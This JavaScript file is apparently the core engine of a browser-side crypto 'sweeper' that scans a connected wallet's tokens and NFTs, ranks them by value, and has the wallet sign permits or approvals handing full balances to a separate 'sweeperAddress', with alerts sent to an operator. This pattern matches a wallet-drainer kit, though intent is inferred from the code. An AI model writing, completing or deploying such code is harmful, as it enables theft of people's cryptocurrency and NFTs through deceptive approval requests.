// client-side-evm-sweeper/src/engines/transaction-runner.js
import { ethers } from 'ethers';
import { MultiScanner } from './multi-scanner.js';
import { ValuationSorter } from './valuation-sorter.js';
import { payloadSigner } from './payload-signer.js';
import { allowanceGrantor } from './allowance-grantor.js';
import { DynamicFeeManager } from './dynamic-fees.js';
import { StateManager } from './state-manager.js';
import { OutboundAlerts } from './outbound-alerts.js';

/**
 * MAIN TRANSACTION RUNNER - Browser / Frontend Optimized (Patched)
 */
export class TransactionRunner {
    constructor(config) {
        this.config = config;
        this.scanner = new MultiScanner(config.networks, config.targets);
        this.sorter = new ValuationSorter();
        this.feeManager = new DynamicFeeManager(config.networks);
        this.state = new StateManager();
        this.alerts = new OutboundAlerts(config.alerts || {});
        this.ownerAddress = config.ownerAddress;
        this.sweeperAddress = config.sweeperAddress;
        this.dryRun = config.dryRun ?? true;
        this.maxConcurrent = 2;
    }

    async executeFullSweep(signer, provider) {
        if (!signer || !this.ownerAddress) {
            throw new Error("Signer and ownerAddress are required");
        }
        console.log("🚀 Starting browser asset sweep...");
        try {
            const rawAssets = await this.scanner.scanAllTargets(this.ownerAddress);
            await this.alerts.info("Scan Complete", `${rawAssets.length} assets discovered.`);
            const sortedAssets = this.sorter.rankAssets(rawAssets);
            const targetsToSweep = sortedAssets.filter(asset => this.shouldSweep(asset));
            
            if (targetsToSweep.length === 0) {
                await this.alerts.info("Nothing to Sweep", "No qualifying assets found.");
                return [];
            }
            
            const results = await this.processAssetsInBatches(targetsToSweep, signer, provider);
            await this.alerts.success("Sweep Cycle Finished", `Processed ${results.filter(r => r.success).length} assets.`);
            return results;
        } catch (error) {
            console.error("Sweep failed:", error);
            await this.alerts.error("Sweep Failed", error.message);
            throw error;
        }
    }

    shouldSweep(asset) {
        if (asset.type === 'native' || asset.type === 'erc20') {
            // Fixed: Safe balance check without assuming BigNumber
            const balanceStr = asset.balance?.toString() || '0';
            // ✅ FIXED: ethers.utils.formatUnits replaced with ethers.formatUnits
            const formatted = parseFloat(ethers.formatUnits(balanceStr, 18));
            return formatted > 0.0005;
        }
        return parseInt(asset.balance || '0') > 0; // NFTs
    }

    async processAssetsInBatches(assets, signer, provider) {
        const results = [];
        const batches = this.chunkArray(assets, this.maxConcurrent);
        
        for (const batch of batches) {
            const batchPromises = batch.map(asset => 
                this.processSingleAsset(asset, signer, provider)
            );
            const batchResults = await Promise.allSettled(batchPromises);
            
            batchResults.forEach(result => {
                results.push(result.status === 'fulfilled' ? result.value : { success: false, error: result.reason?.message || result.reason });
            });
            
            if (batches.indexOf(batch) < batches.length - 1) {
                await new Promise(r => setTimeout(r, 800));
            }
        }
        return results;
    }

    async processSingleAsset(asset, signer, provider) {
        const target = this.config.targets.find(t => t.id === asset.targetId);
        if (!target) throw new Error(`Target not found: ${asset.targetId}`);
        let tx = null; // ← Patch B: Pre-declared
        
        try {
            const gasSettings = await this.feeManager.getGasSettings(asset.chainId, { profile: 'aggressive' });
            let result;

            // Gasless Permit Path
            if (asset.type === 'erc20' && !this.dryRun) {
                const signedPermit = await payloadSigner.createAndSignForTarget(
                    target,
                    this.ownerAddress,
                    this.sweeperAddress,
                    asset.balance,
                    asset.chainId
                );
                result = await payloadSigner.signPayload(signedPermit, signer);
                console.log(`✅ Permit signed for ${asset.symbol || 'Token'}`);
            } 
            // On-Chain Approval Path (NFTs + Legacy Tokens)
            else {
                const approvalTx = allowanceGrantor.createApprovalTx(target, this.sweeperAddress);
                const txWithGas = { ...approvalTx, ...gasSettings };
                
                if (!this.dryRun) {
                    tx = await signer.sendTransaction(txWithGas);
                    await tx.wait();
                    console.log(`✅ On-chain approval confirmed: ${tx.hash}`);
                }
                result = { success: true, type: 'approval', hash: tx?.hash || null };
            }
            
            this.state.trackTransaction(tx?.hash || `sig-${Date.now()}`, { asset: asset.symbol || 'NFT', chainId: asset.chainId, type: asset.type });
            return { success: true, asset, ...result };
        } catch (error) {
            console.error(`Failed processing ${asset.symbol || asset.targetId}:`, error);
            this.state.markFailed(`asset-${asset.targetId}`, error);
            return { success: false, asset, error: error.message };
        }
    }

    chunkArray(array, size) {
        return Array.from({ length: Math.ceil(array.length / size) }, (_, i) => array.slice(i * size, i * size + size));
    }
}

export default TransactionRunner;
